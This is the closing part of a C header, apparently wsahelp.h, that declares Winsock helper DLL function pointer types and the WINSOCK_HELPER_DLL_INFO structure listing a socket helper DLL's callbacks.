typedef INT (WINAPI *PWSH_SET_SOCKET_INFORMATION)(PVOID, SOCKET, HANDLE, HANDLE, INT, INT, PCHAR, INT);
typedef INT (WINAPI *PWSH_STRING_TO_ADDRESS)(LPWSTR, DWORD, LPWSAPROTOCOL_INFOW, LPSOCKADDR, LPDWORD);

//
// WINSOCK_HELPER_DLL_INFO contains all the necessary information about
// a socket's helper DLL.
//

typedef struct _WINSOCK_HELPER_DLL_INFO {
    LIST_ENTRY                  HelperDllListEntry;
    INT                         Unknown;
    HANDLE                      DllHandle;
    INT                         MinSockaddrLength;
    INT                         MaxSockaddrLength;
    INT                         MinTdiAddressLength;
    INT                         MaxTdiAddressLength;
    INT                         UseDelayedAcceptance;
    PWINSOCK_MAPPING            Mapping;
    GUID                        ProviderGUID;
    PWSH_OPEN_SOCKET            WSHOpenSocket;
    PWSH_OPEN_SOCKET2           WSHOpenSocket2;
    PWSH_JOIN_LEAF              WSHJoinLeaf;
    PWSH_NOTIFY                 WSHNotify;
    PWSH_GET_SOCKET_INFORMATION WSHGetSocketInformation;
    PWSH_SET_SOCKET_INFORMATION WSHSetSocketInformation;
    PWSH_GET_SOCKADDR_TYPE      WSHGetSockaddrType;
    PWSH_GET_WILDCARD_SOCKADDR  WSHGetWildcardSockaddr;
    PWSH_GET_BROADCAST_SOCKADDR WSHGetBroadcastSockaddr;
    PWSH_ADDRESS_TO_STRING      WSHAddressToString;
    PWSH_STRING_TO_ADDRESS      WSHStringToAddress;
    PWSH_IOCTL                  WSHIoctl;
} WINSOCK_HELPER_DLL_INFO, *PWINSOCK_HELPER_DLL_INFO;

#ifdef __cplusplus
}
#endif /* __cplusplus */

#endif /* _WSAHELP_H */



```